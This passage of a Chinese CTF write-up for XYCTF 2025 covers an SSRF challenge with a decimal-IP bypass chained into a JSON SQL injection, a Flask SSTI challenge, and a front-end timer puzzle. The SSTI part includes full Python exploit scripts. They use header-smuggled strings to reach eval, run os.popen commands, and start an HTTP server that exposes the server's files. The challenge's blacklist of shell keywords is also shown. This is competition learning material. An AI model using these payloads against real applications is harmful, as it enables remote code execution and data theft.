class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></div>
<p>能够get传入url拼接在http://lamentxu.top的后面，有黑名单检测，内容为所有字母，并且过滤了点号，这里考虑SSRF，使用@能重定向为我们传入的url，我们想要ip为本地（127.0.0.1），这里使用连续十进制绕过，也就是2130706433，端口为8080</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405234435982.png"
                      class=""
                >
<p>看到这个返回结果也是确定自己访问成功了，下一步是传入0的参数，值为abcdefghi，但是传入的url不能有字母，我们考虑到SSRF会进行1次url解码，我们用bp传会自动url解码1次，固2次url编码即可绕过，</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405234624315.png"
                      class=""
                >
<p>到了传json数据的那一步，我们要把name为键名的数据进行json序列化再转化为二进制传入，这里我写了一个脚本便于实现（脚本里已经写了payload，下文解释）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="built_in">str</span>=&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;))))))) union select group_concat(FATE) FROM FATETABLE--+&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;&#125;</span><br><span class="line"><span class="comment">#str=&#123;&quot;name&quot;:[&quot;LAMENTXU&quot;]&#125;</span></span><br><span class="line">b=json.dumps(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其 ASCII 值的二进制表示，并确保每个二进制字符串长度为 8</span></span><br><span class="line">    binary_chunks = [<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> input_string]</span><br><span class="line">    <span class="comment"># 将所有二进制字符串连接在一起</span></span><br><span class="line">    binary_string = <span class="string">&#x27;&#x27;</span>.join(binary_chunks)</span><br><span class="line">    <span class="keyword">return</span> binary_string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line">a=string_to_binary(b)</span><br><span class="line"><span class="built_in">print</span>(string_to_binary(b))</span><br><span class="line"><span class="built_in">print</span>(binary_to_string(a))</span><br><span class="line"><span class="built_in">print</span>(json.loads(b))</span><br></pre></td></tr></table></figure></div>
<p>看到源代码用len(name)限制了长度，不让我们直接查询LAMENTXU的FATE值（这些fate值在init_db.py里），但是如果我们构造{"name":{"123":"123"}}字典嵌套字典，会发现len的计数只有1，但是我们传入的LAMENTXU是无法被使用的，因为具有其他字符以及大括号，那我们考虑闭合引号和右括号，由于我们name的值是一个字典，所有对引号和右括号的过滤是无效的，</p>
<p><code>&#123;"name":&#123;"))))))) or 1=1--+":"1"&#125;&#125;</code>我用这个字符串进行测试，传入后发现成功执行了SQL语句，用order
by发现列数为1，由此得到payload为<code>&#123;"name":&#123;"))))))) union select group_concat(FATE) FROM FATETABLE--+":"1"&#125;&#125;</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250405235559760.png"
                      class=""
                ></p>
<p><code>/proxy?url=@2130706433:8080/1337?0=%61%62%63%64%65%66%67%68%69&amp;1=01111011001000100110111001100001011011010110010100100010001110100010000001111011001000100010100100101001001010010010100100101001001010010010100100100000011101010110111001101001011011110110111000100000011100110110010101101100011001010110001101110100001000000110011101110010011011110111010101110000010111110110001101101111011011100110001101100001011101000010100001000110010000010101010001000101001010010010000001000110010100100100111101001101001000000100011001000001010101000100010101010100010000010100001001001100010001010010110100101101001010110010001000111010001000000010001000110001001000100111110101111101</code>（二进制的序列号字符串，图片为url编码后）</p>
<p>flag{Do4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus!}</p>
<h4 id="web-now-you-see-me-1">web-Now you see me 1</h4>
<p>审计给的代码，一堆helloworld，但是其中藏了真代码，是base64编码的，解码下来看看</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> ,</span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>]</span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
<p>可以看到过滤的内容是非常多的，flask，有渲染函数<code>flask.render_template_string('')</code>，考虑SSTI，这里把request能用的绕过禁了很多，get
post
cookie等都不行了，但是仍然有可用的，request.mimetype能获取Content-Type的内容，request.authorization.type和request.authorization.token能获取Authorization的内容，中间用空格隔开，request.origin能获取Origin的内容，request.referrer能获取Referrer的内容，这样我们可以去构造注入的payload，考虑寻找eval模块（os被删掉了）重新导入os，经过测试，直接传入<code>?My_ins1de_w0r1d=Follow-your-heart-&#123;%print(config)%&#125;</code>就能成功实现SSTI，所以就在里面构造我们想要的结构，这里对request.mimetype传入abcdefghijklmnopqrstuvwxyz_方便我们提取字符，<code>(request.mimetype)|attr(request.origin)()</code>,再对request.origin传入<code>__getitem__</code>括号里填入0即可提取字母a，于是有<code>&#123;'a':0,'b':1,'c':2,'d':3,'e':4,'f':5,'g':6,'h':7,'i':8,'j':9,'k':10,'l':11,'m':12,'n':13,'o':14,'p':15,'q':16,'r':17,'s':18,'t':19,'u':20,'v':21,'w':22,'x':23,'y':24,'z':25,'_':26&#125;</code>字符之间用~连接，于是我们得到</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__base__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__subclasses__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__init__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__globals__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br></pre></td></tr></table></figure></div>
<p>并且我们利用request.authorization.type传入<code>__builtins__</code>写脚本查找具有eval函数的模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 使用 python 脚本 用于寻找序号</span></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeblgk0r4vs0gptx806.cloudeci1.ichunqiu.com:8080/H3dden_route&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    temp=<span class="string">&quot;Follow-your-heart-&#123;%print(()|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))()|attr(request.origin)(&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;)|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr(request.origin)(request.authorization.type))%&#125;&quot;</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&#x27;__getitem__&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;__builtins__&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>:temp&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,params=data,headers=header)</span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:     <span class="comment">#更改要查找的模块（引号内）</span></span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406201519395.png"
                      class=""
                >
<p>我这里随便选了一个118，然后继续构造eval以及执行内容，用request.authorization.token传入eval，用request.referrer传入内容<code>__import__('os').popen('ls /').read()</code>这样可以读取到根目录的信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406204757.png"
                      class=""
                >
<p>但是我cat
/f*却报错了，原来是文件太大没法读取，于是想利用服务器开一个端口用来让我下载文件，命令为<code>cd / &amp;&amp; python3 -m http.server 8088</code></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2zeblgk0r4vs0gptx806.cloudeci1.ichunqiu.com/H3dden_route&quot;</span></span><br><span class="line">payload=<span class="string">&quot;Follow-your-heart-&#123;%print(()|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))()|attr(request.origin)(118)|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr(request.origin)(request.authorization.type)|attr(request.origin)(request.authorization.token)(request.referrer))%&#125;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>:payload&#125;</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz_&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;__getitem__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;__builtins__ eval&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cd / &amp;&amp; python3 -m http.server 8088&#x27;).read()&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res=requests.get(url,params=data,headers=header)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406205012191.png"
                      class=""
                >
<p>下载flag_h3r3</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406205318.png"
                      class=""
                >
<p>得到flag为flag{N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!}</p>
<h4 id="web-ez_puzzle">web-ez_puzzle</h4>
<p>1.前端这种题找一圈也就只有这个js看起来很不一般的样子（真乱啊），那些解混淆工具也没成功。自己做的时候没找到有用的，还以为要从逻辑里找到恢复解压缩前面那坨c的类base64的东西。不过队里的其它师傅通过搜索if搜索审阅，硬是找到了这里可疑的变量yw4。后来想了想根据这个机制，搜索<或者>也可行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406230240750.png"
                      alt="image-20250406230240750" style="zoom:50%;" 
                ></p>
<p>2.控制台里面可以看到其值为2000,猜测就是限制2秒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406230902822.png"
                      alt="image-20250406230902822" style="zoom:50%;" 
                ></p>
<p>3.把限制时间改长，改成9999999999999999999999999，慢慢玩就是了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406231331209.png"
                      alt="image-20250406231331209" style="zoom:50%;" 
                ></p>
<p>flag值：flag{Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!}</p>
<h4 id="pwn-ret2libcs-revenge">pwn-Ret2libc's Revenge</h4>
